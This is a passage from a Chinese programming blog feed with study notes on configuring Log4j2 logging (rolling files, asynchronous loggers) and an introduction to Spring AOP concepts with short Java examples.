     <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;ConsoleAppender&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 添加 ConsoleAppender 控制器 --&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;RollingFileAppender&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 添加 RollingFileAppender 控制器 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Root</span>&gt;</span>  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Loggers</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Configuration</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ol><li><font color="#00b0f0">Confiuration</font>：配置根节点<ol><li><font color="#7030a0">status&#x3D;”WARN”</font>：Log4j2 自身日志输出级别，用来输出 Log4j2 在解析和加载配置文件时的日志信息，用于调试配置文件，生产环境中一般设为 <code>WARN</code> 或更高</li><li><font color="#7030a0">monitorInterval&#x3D;”30”</font>：每 30 秒检查一次配置文件是否有修改，如果修改则自动加载。</li></ol></li><li><font color="#00b0f0">Properties</font>：配置全局属性，定义可以复用的变量，后续可以使用 <code>$&#123;&#125;</code> 引用</li><li><font color="#00b0f0">Appenders</font>：配置日志输出器<ol><li><font color="#7030a0">Console</font>：对应 ConsoleAppender 控制器<ul><li><font color="#9bbb59">name</font>：为这个输出器命名，后续引用</li><li><font color="#9bbb59">target</font>：设置输出方式<ul><li>SYSTEM_OUT：标准输出流，用来输出正常的信息</li><li>SYSTEM_ERR：标准错误流，用来输出错误或警告信息，通常在控制台上显示为红色</li></ul></li></ul></li><li><font color="#7030a0">File</font>：对应 FileAppender 控制器<ul><li><font color="#9bbb59">name</font>：为这个输出器命名，后续引用</li><li><font color="#9bbb59">fileName</font>：指定日志文件的路径，Log4j2 会自动创建目录和文件，无需手动创建</li></ul></li><li><font color="#7030a0">RollingFile</font>：对应 RollingFileAppender 控制器<ul><li><font color="#9bbb59">name</font>：为这个输出器命名，后续引用</li><li><font color="#9bbb59">filePattern</font>：定义日志文件滚动时的命名规则</li></ul></li><li><font color="#7030a0">JDBC</font>：对应 JDBCAppender 控制器</li></ol></li><li><font color="#00b0f0">Loggers</font>：配置日志记录器<ol><li><font color="#7030a0">Logger</font>：为某个特定包或类设置单独的日志级别<ul><li><font color="#9bbb59">name</font>：指定该 Logger 的层级，通常为包名或类名</li><li><font color="#9bbb59">level</font>：指定日志级别</li><li><font color="#9bbb59">additivity</font>：设置是否向上传递日志信息</li></ul></li><li><font color="#7030a0">Root</font>：设置根日志记录器<ul><li><font color="#9bbb59">level</font>：指定根日志记录器的日志级别</li></ul></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项：滚动的流程</p><ol><li><font color="#00b0f0">日志写入</font>：日志会首先写入到当前的 <code>rolling.log</code> 文件</li><li><font color="#00b0f0">滚动触发</font>：<ul><li><font color="#7030a0">按时间滚动</font>：每天，Log4j2 会检查当前日期，并根据配置的 <code>filePattern</code>（如 <code>rolling-%d&#123;yyyy-MM-dd&#125;-%i.log</code>）将 <code>rolling.log</code> 重命名为带有当前日期的文件（例如 <code>rolling-2025-03-12-0.log</code>）。</li><li><font color="#7030a0">按大小滚动</font>：当 <code>rolling.log</code> 文件大小达到指定的阈值（如 10MB）时，Log4j2 会根据配置的 <code>filePattern</code> 进行滚动，生成一个新文件，通常会加上序号（例如 <code>rolling-2025-03-12-1.log</code>），再次达到指定的阈值时，会生成 <code>rolling-2025-3-12-2.log</code>（该机制与 JUL 的轮换机制不同，JUL 是数字越打，文件越旧）</li></ul></li><li><font color="#00b0f0">历史文件管理</font>：根据配置的 <code>max</code> 属性，最多只会保留 <code>max</code> 个历史文件，超出部分的旧日志文件会被删除。</li></ol></blockquote><blockquote><p>[!NOTE] 注意事项：为什么 Log4j2 的配置可以完全在配置文件中完成，而 URL 的配置需要先在配置文件中配置 RootLogger，再在代码中按需为某个特定包或类设置单独的日志级别</p><ol><li><font color="#00b0f0">为什么 JUL 需要两处配置</font>：<ul><li>对于某些包下的代码，如果我们不希望完全沿用 Root Logger 的配置，需要再在代码中手动为这些层级单独定义 Logger</li><li>在 JUL 中，虽然可以在配置文件中为特定层级的 Logger 单独设置日志级别，并选择是否禁止向上传递，但无法为这些 Logger 配置独立的 Handler，它们始终依赖父 Logger 的 Handler</li><li>这可能导致 Logger 输出的信息因父 Handler 的日志级别过滤而丢失（例如，一个 Logger 配置为 CONFIG 级别，而其父 Handler 配置为 INFO 级别，结果 CONFIG 信息被过滤掉）</li><li>因此，必须在代码中单独定义 Logger，而不能完全依赖配置文件</li></ul></li><li><font color="#00b0f0">为什么在 Log4J2 中只需要在一处配置</font><ul><li>在 Log4j2 中，只需在配置文件中直接为 Logger 指定所需的日志级别，日志便能直接输出，无需经过 Handler 的额外过滤</li></ul></li></ol></blockquote><hr><h5 id="4-4-4、配置-Log4J2-异步日志（特色）"><a href="#4-4-4、配置-Log4J2-异步日志（特色）" class="headerlink" title="4.4.4、配置 Log4J2 异步日志（特色）"></a>4.4.4、配置 Log4J2 异步日志（特色）</h5><h6 id="4-4-4-1、异步日志的概念"><a href="#4-4-4-1、异步日志的概念" class="headerlink" title="4.4.4.1、异步日志的概念"></a>4.4.4.1、异步日志的概念</h6><p>异步日志的概念是将日志记录操作交由一个独立的异步线程执行，从而实现业务逻辑和日志记录的并行处理。这种方式能够减少日志记录对主线程性能的影响，提高系统的整体响应速度，例如下面的代码，你会看到它们交替执行：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> &#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] <span class="hljs-keyword">args</span></span>)</span> &#123;  <br>        Logger logger = LoggerFactory.getLogger(Main.<span class="hljs-keyword">class</span>.getName());  <br>        <br>        <span class="hljs-comment">// 记录日志  </span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2000</span>;i++) &#123;  <br>            logger.trace(<span class="hljs-string">&quot;trace 信息&quot;</span>);  <br>            logger.debug(<span class="hljs-string">&quot;debug 信息&quot;</span>);  <br>            logger.info(<span class="hljs-string">&quot;info 信息&quot;</span>);  <br>            logger.warn(<span class="hljs-string">&quot;warn 信息&quot;</span>);  <br>            logger.error(<span class="hljs-string">&quot;error 信息&quot;</span>);  <br>        &#125;  <br>  <br>        <span class="hljs-comment">// 业务逻辑  </span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2000</span>;i++) &#123;  <br>            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;---------------------&quot;</span>);  <br>        &#125;  <br>          <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="4-4-4-2、配置全局异步"><a href="#4-4-4-2、配置全局异步" class="headerlink" title="4.4.4.2、配置全局异步"></a>4.4.4.2、配置全局异步</h6><p>要将所有日志记录操作统一设置为异步模式，只需在类路径下的 <code>resources</code> 目录中创建一个名为 <code>log4j2.component.properties</code> 的属性文件（文件名必须固定），并在其中添加以下配置：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Log4jContextSelector=org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.async</span>.AsyncLoggerContextSelector<br></code></pre></td></tr></table></figure><hr><h6 id="4-4-4-3、配置混合异步（推荐）"><a href="#4-4-4-3、配置混合异步（推荐）" class="headerlink" title="4.4.4.3、配置混合异步（推荐）"></a>4.4.4.3、配置混合异步（推荐）</h6><p>可以在应用中同时使用同步日志和异步日志。通常是在保持根日志记录器为同步的基础上，为某个特定包或类的 Logger 单独配置为异步模式。</p><p>其方法只需要在 <code>log4j2.xml</code> 配置文件中使用 <code>&lt;AsyncLogger&gt;</code> 配置日志记录器（<code>Loggers</code>）即可：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Configuration</span> <span class="hljs-attr">status</span>=<span class="hljs-string">&quot;WARN&quot;</span> <span class="hljs-attr">monitorInterval</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Properties</span>&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LOG_PATTERN&quot;</span>&gt;</span>%d</span><span class="hljs-template-variable">&#123;yyyy-MM-dd HH:mm:ss&#125;</span><span class="language-xml"> [%t] %-5level %logger</span><span class="hljs-template-variable">&#123;36&#125;</span><span class="language-xml"> - %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">Property</span>&gt;</span>   </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Properties</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Appenders</span>&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Console</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ConsoleAppender&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;SYSTEM_OUT&quot;</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;LOG_PATTERN&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span> </span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Console</span>&gt;</span>  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Appenders</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">    <span class="hljs-comment">&lt;!-- 配置日志记录器（Loggers） --&gt;</span>  </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Loggers</span>&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 4.1 为某个包或类的 Logger 单独配置 --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Logger</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.example.service&quot;</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;DEBUG&quot;</span> <span class="hljs-attr">additivity</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;FileAppender&quot;</span>/&gt;</span>   <span class="hljs-comment">&lt;!-- 添加 FileAppender 控制器 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Logger</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 4.2 Root Logger，应用中所有日志的默认入口 --&gt;</span>  </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;INFO&quot;</span>&gt;</span>  </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;ConsoleAppender&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 添加 ConsoleAppender 控制器 --&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;RollingFileAppender&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 添加 RollingFileAppender 控制器 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Root</span>&gt;</span>  </span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 4.3 使用 AsyncLogger 为某个包或类的 Logger 单独配置为异步模式--&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">AsyncLogger</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.example.async&quot;</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;INFO&quot;</span> <span class="hljs-attr">additivity</span>=<span class="hljs-string">&quot;false&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">includeLocation</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;ConsoleAppender&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!-- 添加 ConsoleAppender 控制器 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">AsyncLogger</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Loggers</span>&gt;</span>  </span><br><span class="language-xml">  </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Configuration</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ol><li><font color="#00b0f0">AsynncLogger</font>：配置异步日志记录器<ul><li><font color="#7030a0">name</font>：指定该 Logger 的层级，通常为包名或类名</li><li><font color="#7030a0">level</font>：指定日志级别</li><li><font color="#7030a0">additivity</font>：设置是否向上传递日志信息</li><li><font color="#7030a0">includeLocation</font>：控制是否在日志中包含行号信息。由于获取行号信息会影响日志记录性能，建议将其设置为 <code>false</code>（表示不记录行号信息）以提升效率</li></ul></li></ol><hr><h5 id="4-4-5、调用-SLF4J-Logger-记录日志"><a href="#4-4-5、调用-SLF4J-Logger-记录日志" class="headerlink" title="4.4.5、调用 SLF4J-Logger 记录日志"></a>4.4.5、调用 SLF4J-Logger 记录日志</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">public class Main &#123;  <br>Logger logger <span class="hljs-operator">=</span> LoggerFactory.getLogger(Main.class.getName())<span class="hljs-comment">;  </span><br>logger.trace(<span class="hljs-string">&quot;trace 信息&quot;</span>)<span class="hljs-comment">;  </span><br>logger.debug(<span class="hljs-string">&quot;debug 信息&quot;</span>)<span class="hljs-comment">;  </span><br>logger.info(<span class="hljs-string">&quot;info 信息&quot;</span>)<span class="hljs-comment">;  </span><br>logger.warn(<span class="hljs-string">&quot;warn 信息&quot;</span>)<span class="hljs-comment">;  </span><br>logger.error(<span class="hljs-string">&quot;error 信息&quot;</span>)<span class="hljs-comment">;  </span><br>&#125;<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>日志记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Aop</title>
    <link href="/2025/03/11/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Aop/"/>
    <url>/2025/03/11/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Aop/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="0、导图：Map：Spring-AOP"><a href="#0、导图：Map：Spring-AOP" class="headerlink" title="0、导图：Map：Spring AOP"></a>0、导图：<a href="Map%EF%BC%9ASpringAOP.xmind">Map：Spring AOP</a></h3><hr><h3 id="1、横切关注点"><a href="#1、横切关注点" class="headerlink" title="1、横切关注点"></a>1、横切关注点</h3><h4 id="1-1、模型图"><a href="#1-1、模型图" class="headerlink" title="1.1、模型图"></a>1.1、模型图</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Aop/image-20250311102729843.png"></p><hr><h4 id="1-2、常见关注点"><a href="#1-2、常见关注点" class="headerlink" title="1.2、常见关注点"></a>1.2、常见关注点</h4><ol><li><p><strong>日志记录</strong>：自动记录方法的调用、输入输出参数、执行时间等，避免在每个方法中手动编写日志代码。</p></li><li><p><strong>事务管理</strong>：在数据操作前后自动管理事务，确保数据一致性。</p></li><li><p><strong>权限验证</strong>：在方法调用前检查用户权限。</p></li><li><p><strong>性能监控</strong>：记录方法执行时间，帮助优化系统性能。</p></li><li><p><strong>异常处理</strong>：集中管理异常处理逻辑，避免在多个地方重复代码。</p></li><li><p>**其他功能增强</p></li></ol><hr><h3 id="2、AOP"><a href="#2、AOP" class="headerlink" title="2、AOP"></a>2、AOP</h3><h4 id="2-1、AOP-概述"><a href="#2-1、AOP-概述" class="headerlink" title="2.1、AOP 概述"></a>2.1、AOP 概述</h4><p>&#x3D;&#x3D;问题1：横切关注点的管理&#x3D;&#x3D;<br>在复杂的应用程序中，诸如日志记录、事务管理等功能常常在多个模块中反复出现。这些与核心业务逻辑无关的功能统称为横切关注点。由于它们与核心业务逻辑无关却紧密交织，导致了以下问题：</p><ul><li><strong>代码冗余</strong>：相同的横切关注点在不同模块中重复实现。</li><li><strong>维护成本高</strong>：当横切关注点发生变化时，开发者需要在多个地方修改，容易出错，增加了维护的复杂度。</li><li><strong>代码可读性下降</strong>：核心业务逻辑与横切关注点混杂，使代码难以理解和维护。<br>为了解决这些问题，我们可以考虑将横切关注点抽离出来，进行统一管理。在核心业务逻辑执行时，再将这些横切关注点插入到相应的执行流程中。这种方法能够提高代码的可维护性和可读性，降低冗余和复杂性。</li></ul><p>&#x3D;&#x3D;问题2：功能增强的复杂性&#x3D;&#x3D;<br>在开发过程中，我们经常需要对现有方法进行增强，例如在方法执行流程中插入其他功能。代理机制使我们能够在不改变目标对象的情况下添加新功能，因此代理模式常被用于功能增强。然而，手动创建代理类并管理代理行为在大规模应用中往往显得繁琐且容易出错。<br>为了解决这一问题，我们可以考虑对代理模式进行封装，以简化操作，使开发者能够更轻松地应用增强功能，从而降低复杂性和出错率。</p><p>&#x3D;&#x3D;问题的核心&#x3D;&#x3D;<br>这两个问题的核心在于：如何统一管理横切关注点，以及如何在方法（核心业务）的执行流程中轻松地插入其他功能（横切关注点）。我们需要一种简单而有效的方式，使这些功能的插入既灵活又不增加开发和维护的复杂性。</p><p>&#x3D;&#x3D;AOP 解决方案&#x3D;&#x3D;<br>AOP（Aspect-Oriented Programming，面向切面编程）是一种通过“切面”实现横切关注点管理的编程方式。它使开发者能够在不修改原始业务逻辑的前提下，为系统添加或修改功能增强，从而提升系统的灵活性和可维护性。AOP 通过将横切关注点与业务逻辑分离，实现集中管理和自动化增强，解决了以下两个关键问题：</p><ol><li><strong>集中管理横切关注点</strong>：<ul><li>AOP 使用“切面”（Aspect）将横切关注点的逻辑从业务代码中抽离，减少代码重复，提升代码的清晰度。常见的横切关注点包括日志记录、安全性检查和事务管理等。</li></ul></li><li><strong>简化功能增强实现</strong>：<ul><li>AOP 封装了代理模式，使开发者无需手动编写代理类。通过简单的配置或注解，开发者可以动态为目标方法添加增强逻辑，例如在方法调用前后执行额外操作，如日志记录、权限验证或性能监控。</li></ul></li></ol><hr><h4 id="2-2、AOP-的实现方式"><a href="#2-2、AOP-的实现方式" class="headerlink" title="2.2、AOP 的实现方式"></a>2.2、AOP 的实现方式</h4><p>AOP（面向切面编程）的实现方式一般是基于<strong>代理模式</strong>或<strong>字节码增强技术</strong>来实现，具体取决于框架的设计和实现。</p><hr><h4 id="2-3、常见-AOP-框架和库"><a href="#2-3、常见-AOP-框架和库" class="headerlink" title="2.3、常见 AOP 框架和库"></a>2.3、常见 AOP 框架和库</h4><table><thead><tr><th>框架</th><th>织入时机</th><th>特点</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>AspectJ</strong></td><td>编译期 &#x2F; 类加载期 &#x2F; 运行期</td><td>功能强大，支持多种织入方式，适合大型项目</td><td>需要强大的功能并独立于框架</td></tr><tr><td><strong>Spring AOP</strong></td><td>运行期</td><td>基于代理实现，简单易用，性能稍弱</td><td>如果项目使用的是 Spring</td></tr><tr><td><strong>JBoss AOP</strong></td><td>编译期 &#x2F; 运行期</td><td>与 JBoss 深度集成，配置稍复杂</td><td>如果是 Java EE 项目</td></tr><tr><td><strong>Guice AOP</strong></td><td>运行期</td><td>简单直观，但功能有限</td><td>如果项目基于 Guice 依赖注入框架</td></tr></tbody></table><hr><h4 id="2-4、Spring-AOP-是什么"><a href="#2-4、Spring-AOP-是什么" class="headerlink" title="2.4、Spring AOP 是什么"></a>2.4、Spring AOP 是什么</h4><p>Spring AOP 是 Spring 框架提供的 AOP 实现，专门用于与 Spring 应用程序集成。它允许开发者在 Spring 管理的 Bean 对象中定义切面和切点，从而在方法执行前后插入横切逻辑。</p><hr><h4 id="2-5、Spring-AOP-七大术语"><a href="#2-5、Spring-AOP-七大术语" class="headerlink" title="2.5、Spring AOP 七大术语"></a>2.5、Spring AOP 七大术语</h4><h5 id="2-5-1、目标对象（Target）"><a href="#2-5-1、目标对象（Target）" class="headerlink" title="2.5.1、目标对象（Target）"></a>2.5.1、目标对象（Target）</h5><p>目标对象是我们希望在其上应用切面的对象。通过切面增强目标对象的功能，就是在目标对象的目标方法上进行增强，通常是通过在方法执行前、后或抛出异常时插入特定的逻辑。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 目标类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-comment">// 目标方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> username</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;User created: &quot;</span> + username);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-5-2、连接点（Joinpoint）"><a href="#2-5-2、连接点（Joinpoint）" class="headerlink" title="2.5.2、连接点（Joinpoint）"></a>2.5.2、连接点（Joinpoint）</h5><p>连接点指的是在目标对象的方法执行过程中，切面可以织入的具体位置，包括方法执行前、方法执行后、以及方法抛出异常后等常见的连接点。</p><hr><h5 id="2-5-3、切面（Aspect）"><a href="#2-5-3、切面（Aspect）" class="headerlink" title="2.5.3、切面（Aspect）"></a>2.5.3、切面（Aspect）</h5><p>切面定义了在哪些切点应用特定的逻辑（切面 &#x3D; 切面类 + 切点 + 通知）。一个程序可以包含多个切面，而每个切面可以包含多个通知，并可应用于多个切点。通过切面，能够将横切关注点从核心业务逻辑中分离出来，从而提高代码的可维护性和可复用性。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Aspect</span> <span class="hljs-comment">// 在 Java 中，一个切面就是一个 @Aspect 标注的切面类</span><br><span class="hljs-variable">@Order</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 规定在多个切面中，本切面的执行顺序，数字越小越先执行</span><br>public class LoggingAspect &#123;<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-5-4、切点（Pointcut）"><a href="#2-5-4、切点（Pointcut）" class="headerlink" title="2.5.4、切点（Pointcut）"></a>2.5.4、切点（Pointcut）</h5><h6 id="2-5-4-1、切点概述"><a href="#2-5-4-1、切点概述" class="headerlink" title="2.5.4.1、切点概述"></a>2.5.4.1、切点概述</h6><p>切点是一个表达式，用于指定在目标方法的哪些连接点上应用通知，简单来说，就是定义了通知的执行位置。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Aspect</span><br><span class="hljs-variable">@Order</span>(<span class="hljs-number">1</span>)<br>public class LoggingAspect &#123;<br><br>    <span class="hljs-comment">// 切点：匹配所有控制器方法</span><br>    <span class="hljs-variable">@Pointcut</span>(<span class="hljs-string">&quot;execution(* com.example.controller.*.*(..))&quot;</span>)<br>    public void <span class="hljs-built_in">controllerMethods</span>() &#123;&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="2-5-4-2、切点表达式书写方法"><a href="#2-5-4-2、切点表达式书写方法" class="headerlink" title="2.5.4.2、切点表达式书写方法"></a>2.5.4.2、切点表达式书写方法</h6><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Aop/image-20250311103200725.png"></p><hr><h6 id="2-5-4-3、切点表达式应用方法"><a href="#2-5-4-3、切点表达式应用方法" class="headerlink" title="2.5.4.3、切点表达式应用方法"></a>2.5.4.3、切点表达式应用方法</h6><p>&#x3D;&#x3D;1.分离切点定义与通知（推荐）&#x3D;&#x3D;</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">/**</span><br><span class="hljs-comment">在这种方式中，切点定义和通知是分开的，切点通过`@Pointcut 注解定义，通知通过`@Before 和`@After 等注解绑定到具体的切点。这种方式结构清晰，适合在切面中有多个切点的场景。</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-variable">@Aspect</span><br><span class="hljs-variable">@Component</span><br>public class LoggingAspect &#123;<br>    <br>    <span class="hljs-comment">// 定义切点1：需要的切点</span><br>    <span class="hljs-variable">@Pointcut</span>(<span class="hljs-string">&quot;execution(* com.example.UserService.do1()) || execution(* com.example.UserService.do3())&quot;</span>)<br>    public void <span class="hljs-built_in">selectedMethods</span>() &#123;&#125;<br>    <br>    <span class="hljs-comment">// 定义切点2：只是用来演示，演示切面类中可以有很多切点</span><br>    <span class="hljs-variable">@Pointcut</span>(<span class="hljs-string">&quot;execution(* com.example.controller..*(..))&quot;</span>)<br>    public void <span class="hljs-built_in">controllerMethods</span>() &#123;&#125;<br><br>    <span class="hljs-comment">// 前置通知</span><br>    <span class="hljs-variable">@Before</span>(<span class="hljs-string">&quot;controllerMethods()&quot;</span>)<br>    public void <span class="hljs-built_in">logBeforeController</span>(JoinPoint joinPoint) &#123;<br>        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">&quot;Controller method executing: &quot;</span> + joinPoint.<span class="hljs-built_in">getSignature</span>().<span 